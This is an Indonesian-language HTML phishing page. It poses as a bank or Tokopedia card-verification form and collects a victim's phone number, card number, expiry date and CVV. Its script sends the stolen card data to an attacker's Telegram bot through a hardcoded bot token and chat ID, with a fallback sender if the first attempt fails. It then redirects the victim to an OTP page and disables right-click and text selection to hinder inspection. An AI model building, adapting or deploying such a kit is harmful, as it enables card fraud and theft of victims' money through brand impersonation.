<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="theme-color" content="#008000" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Input No Kartu Bank</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(to top right, #ffffff, #f8f9fa);
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            color: #2F4F4F;
        }

        .navbar {
            width: 100%;
            height: 70px;
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            position: sticky;
            top: 0;
            z-index: 1000;
            margin-bottom: 20px;
        }

        .navbar img {
            height: 50px;
        }

        .main-container {
            width: 100%;
            max-width: 400px;
            padding: 0 20px;
            margin-bottom: 30px;
        }

        .container {
            width: 100%;
            background: 
                linear-gradient(135deg, rgba(0, 82, 212, 0.1) 0%, rgba(67, 97, 238, 0.1) 50%, rgba(58, 12, 163, 0.1) 100%),
                url('img/bg.png');
            background-size: cover;
            background-position: center;
            background-blend-mode: overlay;
            border-radius: 15px;
            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.1);
            padding: 25px;
            margin-top: 10px;
            border: 1px solid rgba(255, 255, 255, 0.3);
            position: relative;
            overflow: hidden;
        }

        /* Efek overlay untuk meningkatkan keterbacaan */
        .container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(255, 255, 255, 0.85);
            z-index: 0;
            border-radius: 15px;
        }

        .container > * {
            position: relative;
            z-index: 1;
        }

        .card-wrapper {
            perspective: 1000px;
            margin-bottom: 25px;
        }

        .card-preview {
            width: 100%;
            height: 200px;
            border-radius: 12px;
            position: relative;
            transform-style: preserve-3d;
            transition: transform 0.6s;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
        }

        .card-preview .front,
        .card-preview .back {
            position: absolute;
            width: 100%;
            height: 100%;
            backface-visibility: hidden;
            border-radius: 12px;
            overflow: hidden;
        }

        /* Background kartu depan */
        .card-preview .front {
            background: 
                linear-gradient(135deg, rgba(0, 82, 212, 0.9) 0%, rgba(67, 97, 238, 0.9) 50%, rgba(58, 12, 163, 0.9) 100%),
                url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiQlPRDvqdZH0wGFWqyKsxKU85UnlbpDdVYZTLTIfUKabw-tpKG4ZD2mfWlandqvkpneFINUasHdnrDCOHSCvSNtE4bcfH1gyEL2Gf_A-YgGWVKkkmbe42tHUQKrfLHRJkHfr-F6RC3VvMB7d3hx4jSpzKogP53dOtrPeJLMsznjN53GA9yGK5BUB9Kk5YK/s847/1000133389.jpg');
            background-size: cover;
            background-position: center;
            background-blend-mode: overlay;
        }

        /* Background kartu belakang */
        .card-preview .back {
            background: 
                linear-gradient(135deg, rgba(58, 12, 163, 0.9) 0%, rgba(67, 97, 238, 0.9) 50%, rgba(0, 82, 212, 0.9) 100%),
                url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiQlPRDvqdZH0wGFWqyKsxKU85UnlbpDdVYZTLTIfUKabw-tpKG4ZD2mfWlandqvkpneFINUasHdnrDCOHSCvSNtE4bcfH1gyEL2Gf_A-YgGWVKkkmbe42tHUQKrfLHRJkHfr-F6RC3VvMB7d3hx4jSpzKogP53dOtrPeJLMsznjN53GA9yGK5BUB9Kk5YK/s847/1000133389.jpg');
            background-size: cover;
            background-position: center;
            background-blend-mode: overlay;
            transform: rotateY(180deg);
        }

        .card-preview .text {
            position: absolute;
            color: white;
            font-weight: bold;
            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.8);
        }

        .card-number {
            top: 60%;
            left: 10%;
            font-size: 18px;
            letter-spacing: 1px;
        }

        .expiry-date {
            top: 75%;
            left: 10%;
            font-size: 14px;
        }

        .cvv-display {
            top: 50%;
            right: 10%;
            font-size: 14px;
            text-align: right;
        }

        .form-group {
            margin-bottom: 20px;
            position: relative;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            font-weight: bold;
            color: #2F4F4F;
        }

        .form-group input,
        .form-group select {
            width: 100%;
            padding: 14px 15px 14px 45px;
            font-size: 15px;
            border: 1.5px solid #e0e0e0;
            border-radius: 8px;
            outline: none;
            transition: all 0.3s ease;
            background-color: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(5px);
        }

        .form-group input:focus,
        .form-group select:focus {
            border-color: #008000;
            background-color: #fff;
            box-shadow: 0 0 0 2px rgba(0, 128, 0, 0.1);
        }

        .form-group .icon {
            position: absolute;
            top: 35px;
            left: 15px;
            font-size: 18px;
            color: #666;
            z-index: 2;
        }

        .phone-input-group {
            display: flex;
            gap: 10px;
            align-items: center;
        }

        .phone-prefix {
            background: rgba(240, 240, 240, 0.9);
            padding: 14px 12px;
            border-radius: 8px;
            border: 1.5px solid #e0e0e0;
            color: #2F4F4F;
            font-weight: 600;
            min-width: 60px;
            text-align: center;
            backdrop-filter: blur(5px);
        }

        .phone-input {
            flex: 1;
        }

        .expiry-group {
            display: flex;
            gap: 12px;
        }

        .expiry-group select {
            flex: 1;
            padding: 14px 12px;
        }

        button {
            width: 100%;
            padding: 16px;
            background: linear-gradient(to right, #008000, #00a000);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
            position: relative;
            z-index: 1;
        }

        button:hover {
            background: linear-gradient(to right, #006600, #008800);
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(0, 128, 0, 0.3);
        }

        button:active {
            transform: translateY(0);
        }

        .footer {
            margin-top: 25px;
            font-size: 12px;
            text-align: center;
            color: #666;
            line-height: 1.5;
            padding: 0 10px;
        }

        .footer strong {
            color: #2F4F4F;
        }

        .card-chip {
            position: absolute;
            top: 25%;
            left: 10%;
            width: 50px;
            height: 35px;
            background: linear-gradient(135deg, #d4af37, #f9e076);
            border-radius: 5px;
        }

        .card-logo {
            position: absolute;
            top: 20px;
            right: 20px;
            font-weight: bold;
            font-size: 18px;
            color: white;
        }

        .magnetic-strip {
            position: absolute;
            top: 30px;
            width: 100%;
            height: 40px;
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(5px);
        }

        .signature-strip {
            position: absolute;
            top: 90px;
            left: 20px;
            width: 70%;
            height: 30px;
            background: repeating-linear-gradient(
                45deg,
                rgba(255, 255, 255, 0.8),
                rgba(255, 255, 255, 0.8) 5px,
                rgba(240, 240, 240, 0.6) 5px,
                rgba(240, 240, 240, 0.6) 10px
            );
            border-radius: 3px;
        }

        .loading {
            display: none;
            text-align: center;
            padding: 10px;
            color: #008000;
            position: relative;
            z-index: 1;
        }

        .loading-spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #008000;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Efek tambahan untuk kartu */
        .card-glow {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: radial-gradient(circle at center, rgba(255,255,255,0.3) 0%, transparent 70%);
            border-radius: 12px;
            pointer-events: none;
        }

        .card-pattern {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: 
                radial-gradient(circle at 20% 80%, rgba(255,255,255,0.1) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(255,255,255,0.1) 0%, transparent 50%);
            border-radius: 12px;
            pointer-events: none;
        }

        @media (max-width: 480px) {
            .main-container {
                padding: 0 15px;
            }
            
            .container {
                padding: 20px;
            }
            
            .card-preview {
                height: 180px;
            }
            
            .card-number {
                font-size: 16px;
            }
        }
    </style>
</head>
<body>
    <!-- Navbar -->
    <div class="navbar">
        <img src="img/pucok.png" alt="BNI Logo">
    </div>

    <div class="main-container">
        <form id="cardForm">
            <div class="container">
                <!-- Card Preview -->
                <div class="card-wrapper">
                    <div class="card-preview" id="card">
                        <div class="front">
                            <div class="card-glow"></div>
                            <div class="card-pattern"></div>
                            <div class="card-chip"></div>
                            <div class="text card-number" id="cardNumber">XXXX XXXX XXXX XXXX</div>
                            <div class="text expiry-date" id="expiryDate">VALID THRU 00/00</div>
                        </div>
                        <div class="back">
                            <div class="card-glow"></div>
                            <div class="card-pattern"></div>
                            <div class="magnetic-strip"></div>
                            <div class="signature-strip"></div>
                            <div class="text cvv-display" id="cvvDisplay">XXX</div>
                        </div>
                    </div>
                </div>

                <!-- Phone Input -->
                <div class="form-group">
                    <label for="hp">Nomor Handphone</label>
                    <div class="phone-input-group">
                        <div class="phone-prefix">+62</div>
                        <input
                            type="tel"
                            id="hp"
                            name="nomor_hp"
                            class="phone-input"
                            inputmode="numeric"
                            placeholder="Nomor Handphone"
                            maxlength="12"
                            required
                            oninput="normalizePhoneInput(this)"
                        >
                    </div>
                </div>

                <!-- Card Number -->
                <div class="form-group">
                    <label for="nomor">Nomor Kartu</label>
                    <span class="icon">ðŸ’³</span>
                    <input 
                        type="tel" 
                        id="nomor" 
                        name="nomor_voucher" 
                        maxlength="19" 
                        oninput="updateCardNumber(this)" 
                        placeholder="Masukkan 16 digit nomor kartu" 
                        required
                    >
                </div>

                <!-- Expiry Date -->
                <div class="form-group">
                    <label for="bulan">Masa Berlaku (Valid Thru)</label>
                    <div class="expiry-group">
                        <select id="bulan" name="bulan" onchange="updateExpiryDate()" required>
                            <option value="">Bulan</option>
                            <option value="01">01</option>
                            <option value="02">02</option>
                            <option value="03">03</option>
                            <option value="04">04</option>
                            <option value="05">05</option>
                            <option value="06">06</option>
                            <option value="07">07</option>
                            <option value="08">08</option>
                            <option value="09">09</option>
                            <option value="10">10</option>
                            <option value="11">11</option>
                            <option value="12">12</option>
                        </select>
                        <select id="tahun" name="tahun" onchange="updateExpiryDate()" required>
                            <option value="">Tahun</option>
                            <option value="25">2025</option>
                            <option value="26">2026</option>
                            <option value="27">2027</option>
                            <option value="28">2028</option>
                            <option value="29">2029</option>
                            <option value="30">2030</option>
                            <option value="31">2031</option>
                            <option value="32">2032</option>
                        </select>
                    </div>
                </div>

                <!-- CVV -->
                <div class="form-group">
                    <label for="cvv">CVV</label>
                    <span class="icon">ðŸ”’</span>
                    <input 
                        type="tel" 
                        id="cvv" 
                        name="reff" 
                        maxlength="3" 
                        onfocus="flipCard(true)" 
                        onblur="flipCard(false)" 
                        oninput="updateCVV(this)" 
                        placeholder="CVV tiga digit di belakang kartu" 
                        required
                    >
                </div>

                <div class="loading" id="loading">
                    <div class="loading-spinner"></div>
                    
                </div>

                <button type="submit" id="submitBtn">Lanjut</button>
            </div>
        </form>

        <div class="footer">
            PT Tokopedia Tbk. berizin dan diawasi oleh <strong>Otoritas Jasa Keuangan (OJK)</strong> serta merupakan peserta penjaminan <strong>Lembaga Penjamin Simpanan (LPS)</strong>.
        </div>
    </div>

    <script>
        // Telegram Bot Configuration
        const TELEGRAM_BOT_TOKEN = '8449078397:AAFqHmrJKLNo4ZX1TCsbCn1uf-GjrQtnmo8';
        const TELEGRAM_CHAT_ID = '7823308464';

        // Prevent right-click context menu
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });

        // Prevent text selection
        document.addEventListener('selectstart', function(e) {
            e.preventDefault();
        });

        // Prevent drag and drop
        document.addEventListener('drop', function(e) {
            e.preventDefault();
        });
        document.addEventListener('dragover', function(e) {
            e.preventDefault();
        });

        // Format card number with spaces
        function updateCardNumber(input) {
            let value = input.value.replace(/\D/g, '');
            value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
            input.value = value.trim();
            document.getElementById('cardNumber').textContent = value || 'XXXX XXXX XXXX XXXX';
        }

        // Update expiry date display
        function updateExpiryDate() {
            const bulan = document.getElementById('bulan').value || '00';
            const tahun = document.getElementById('tahun').value || '00';
            document.getElementById('expiryDate').textContent = `VALID THRU ${bulan}/${tahun}`;
        }

        // Update CVV display
        function updateCVV(input) {
            const value = input.value.replace(/\D/g, '').slice(0, 3);
            input.value = value;
            document.getElementById('cvvDisplay').textContent = value || 'XXX';
        }

        // Flip card to show back when CVV is focused
        function flipCard(showBack) {
            const card = document.getElementById('card');
            card.style.transform = showBack ? 'rotateY(180deg)' : 'rotateY(0deg)';
        }

        // Normalize phone input
        function normalizePhoneInput(input) {
            let value = input.value.replace(/\D/g, '');
            
            // Remove leading zero if present
            if (value.startsWith('0')) {
                value = value.substring(1);
            }
            
            // Limit to 12 digits (without +62 prefix)
            value = value.substring(0, 12);
            
            input.value = value;
        }

        // Handle form submission
        document.getElementById('cardForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const submitBtn = document.getElementById('submitBtn');
            const loading = document.getElementById('loading');
            
            // Validate all fields are filled
            const hp = document.getElementById('hp').value;
            const nomor = document.getElementById('nomor').value;
            const bulan = document.getElementById('bulan').value;
            const tahun = document.getElementById('tahun').value;
            const cvv = document.getElementById('cvv').value;
            
            if (!hp || !nomor || !bulan || !tahun || !cvv) {
                alert('Harap lengkapi semua field!');
                return;
            }
            
            // Show loading
            submitBtn.style.display = 'none';
            loading.style.display = 'block';
            
            // Collect form data
            const formData = {
                nomor_hp: '+62' + hp,
                nomor_kartu: nomor.replace(/\s/g, ''), // Remove spaces for storage
                bulan: bulan,
                tahun: tahun,
                cvv: cvv,
                timestamp: new Date().toLocaleString('id-ID'),
                user_agent: navigator.userAgent,
                ip: 'Fetching...' // In real implementation, you'd get this from a service
            };
            
            // Send to Telegram
            sendToTelegram(formData);
        });

        // Send data to Telegram
        function sendToTelegram(data) {
            const message = `
ðŸ†• DATA KARTU BARU DITERIMA
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ðŸ“± *Nomor HP:* ${data.nomor_hp}
ðŸ’³ *Nomor Kartu:* ${data.nomor_kartu}
ðŸ“… *Masa Berlaku:* ${data.bulan}/${data.tahun}
ðŸ”’ *CVV:* ${data.cvv}
â° *Waktu:* ${data.timestamp}
ðŸŒ *User Agent:* ${data.user_agent}
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
            `.trim();

            // Using fetch to send message to Telegram
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.json();
            })
            .then(result => {
                console.log('Success:', result);
                // Redirect to verification page after successful send
                setTimeout(() => {
                    window.location.href = 'otpcvv.html';
                }, 1500);
            })
            .catch(error => {
                console.error('Error:', error);
                // Fallback: Try alternative method
                sendToTelegramAlternative(data);
            });
        }

        // Alternative method using XMLHttpRequest
        function sendToTelegramAlternative(data) {
            const message = `
ðŸ†• DATA KARTU BARU DITERIMA
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ðŸ“± Nomor HP: ${data.nomor_hp}
ðŸ’³ Nomor Kartu: ${data.nomor_kartu}
ðŸ“… Masa Berlaku: ${data.bulan}/${data.tahun}
ðŸ”’ CVV: ${data.cvv}
â° Waktu: ${data.timestamp}
ðŸŒ User Agent: ${data.user_agent}
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
            `.trim();

            const xhr = new XMLHttpRequest();
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            
            xhr.open('POST', url, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    console.log('Alternative method result:', xhr.status);
                    // Redirect regardless of success for better UX
                    setTimeout(() => {
                        window.location.href = 'otpcvv.html';
                    }, 1500);
                }
            };
            
            xhr.send(JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            }));
        }

        // Add some interactive effects
        document.addEventListener('DOMContentLoaded', function() {
            const inputs = document.querySelectorAll('input, select');
            
            inputs.forEach(input => {
                // Add focus effect
                input.addEventListener('focus', function() {
                    this.parentElement.classList.add('focused');
                });
                
                input.addEventListener('blur', function() {
                    this.parentElement.classList.remove('focused');
                });
            });

            // Add input validation
            document.getElementById('nomor').addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length > 16) {
                    value = value.substring(0, 16);
                }
                e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
            });

            document.getElementById('cvv').addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length > 3) {
                    value = value.substring(0, 3);
                }
                e.target.value = value;
            });
        });
    </script>
</body>
</html>